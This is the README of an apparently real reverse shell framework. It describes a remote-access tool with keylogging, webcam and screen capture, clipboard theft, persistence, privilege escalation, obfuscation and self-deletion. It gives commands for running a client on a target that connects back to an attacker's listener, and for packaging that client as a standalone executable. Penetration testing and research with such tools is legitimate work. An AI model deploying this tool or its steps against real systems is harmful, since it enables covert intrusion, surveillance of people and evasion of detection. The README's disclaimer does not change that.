# 🛡️ Reverse Shelly — Advanced Reverse Shell Framework

A powerful, feature-rich reverse shell framework for **authorized penetration testing**, **cybersecurity research**, and **red team operations**. Encrypted, multi-session, and packed with advanced capabilities.

## ✨ Features

- **SSL/TLS Encryption**: All communications encrypted with industry-standard protocols
- **Multi-Session Management**: Handle multiple target connections simultaneously
- **File Transfer**: Secure encrypted upload/download between listener and client
- **Surveillance**: Screenshot, webcam capture, keylogging, clipboard access
- **Persistence**: Registry, crontab, scheduled tasks, and more
- **Investigation Tools**: `netinfo`, `sysinfo`, `users`, `ps`, `find`, and more
- **Advanced Operations**: Privilege escalation, in-memory execution, self-destruct
- **Plugin System**: Extensible architecture for custom modules
- **Cross-platform**: Works on Windows, macOS, and Linux

## 📋 Requirements

### Python Dependencies
```bash
pip install -r requirements.txt
```

### Key Dependencies
- **cryptography** — SSL/TLS and certificate generation
- **pynput** — Keylogging
- **pyperclip** — Clipboard access
- **opencv-python** / **pillow** — Screenshots and webcam
- **python-crontab** — Linux persistence (Linux only)
- **pywin32** — Windows features (Windows only)

### SSL Certificates
- The listener can auto-generate self-signed certificates
- Or generate manually: see [Reverse Shelly/ssl_setup_readme.md](Reverse%20Shelly/ssl_setup_readme.md)

## 🚀 Quick Start

### Option 1: Run from Source

**Terminal 1 — Listener (Attacker):**
```bash
cd "Reverse Shelly"
python reverse_shell_listener.py <your_ip> <port>
# Example: python reverse_shell_listener.py 192.168.1.100 4444
```

**Terminal 2 — Client (Target):**
```bash
cd "Reverse Shelly"
python reverse_shell_client.py <attacker_ip> <port>
# Example: python reverse_shell_client.py 192.168.1.100 4444
```

### Option 2: Use the Batch Files (Windows)
- **run_listener.bat** — Quick start for the listener
- **run_client.bat** — Quick start for the client

## 📖 Usage

1. **Start the listener** on your machine (attacker)
2. **Run the client** on the target machine with your listener's IP and port
3. **Authenticate** — both use shared secret `SuperSecretToken123` (change before real use!)
4. **Execute commands** — full shell access with additional built-in commands
5. **Use built-ins**: `upload`, `download`, `screenshot`, `keylog_start`, `persist`, `sysinfo`, and more

## 📁 Project Structure

```
Reverse Shelly/
├── reverse_shell_listener.py   # Listener (attacker)
├── reverse_shell_client.py     # Client (target)
├── server.pem                  # SSL certificate (generate server.key locally)
├── setup_script.sh             # Linux/macOS setup
├── readme.md                   # Detailed documentation
└── ssl_setup_readme.md         # SSL certificate guide

run_listener.bat                # Windows quick start — listener
run_client.bat                  # Windows quick start — client
requirements.txt                # Python dependencies
install-windows.txt             # Windows installation guide
```

## 🔧 Configuration

### Shared Secret
Change `SHARED_SECRET` in both listener and client scripts before use:
```python
SHARED_SECRET = "YourSecureTokenHere"
```

### SSL Certificates
- **Auto-generation**: Listener creates certificates on first run if missing
- **Manual**: Use OpenSSL or see `Reverse Shelly/ssl_setup_readme.md`
- **Note**: `server.key` is never committed — generate locally

## 🛠️ Development

### Building an Executable (Client)
```bash
pyinstaller --onefile --name "ReverseShellyClient" "Reverse Shelly/reverse_shell_client.py"
```

### Project Structure
```
README.md              # This file
.gitignore             # Git ignore rules
requirements.txt       # Python dependencies
install-windows.txt    # Windows setup guide
Reverse Shelly/        # Main framework
```

## 📝 Features in Detail

### Security & Encryption
- **SSL/TLS**: Encrypted transport
- **Shared Secret**: Token authentication
- **Obfuscation**: Base64 encoding, random delays

### Built-in Commands (from listener)
| Command | Description |
|---------|-------------|
| `upload` / `download` | File transfer |
| `screenshot` | Capture target screen |
| `webcam` | Capture from camera |
| `keylog_start` / `keylog_stop` | Keylogging |
| `persist` | Add persistence |
| `sysinfo` / `netinfo` | System & network info |
| `selfdestruct` | Remove all traces |

See [Reverse Shelly/readme.md](Reverse%20Shelly/readme.md) for full command reference.

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## 📄 License

This project is for educational and authorized use. See documentation for terms.

## ⚠️ Disclaimer

**Use this tool only for authorized penetration testing, cybersecurity research, and educational purposes.**

- Never use on systems without explicit written permission
- Unauthorized access to computer systems is illegal
- Respect all applicable laws and ethical guidelines
- Test only in controlled environments (VMs, lab networks)

## 🐛 Troubleshooting

### Connection Issues
- Ensure firewall allows traffic on the chosen port
- Verify IP address (use `ipconfig` / `ip addr` for local IP)
- For different networks: configure port forwarding on your router

### "Module not found"
- Run `pip install -r requirements.txt`
- Use a virtual environment: `python -m venv venv` then activate

### SSL/Certificate Issues
- Let the listener auto-generate certificates on first run
- Or follow [ssl_setup_readme.md](Reverse%20Shelly/ssl_setup_readme.md)

### Common Solutions
1. **"Address already in use"**: Change port or close other listeners
2. **"Connection refused"**: Check listener is running and IP/port are correct
3. **Authentication failed**: Ensure same `SHARED_SECRET` in both scripts

## 📞 Support

If you encounter issues:
1. Check the troubleshooting section
2. Review [Reverse Shelly/readme.md](Reverse%20Shelly/readme.md) for detailed docs
3. Ensure all dependencies are installed
4. Verify network configuration

---

**Made with ❤️ for cybersecurity professionals and researchers**
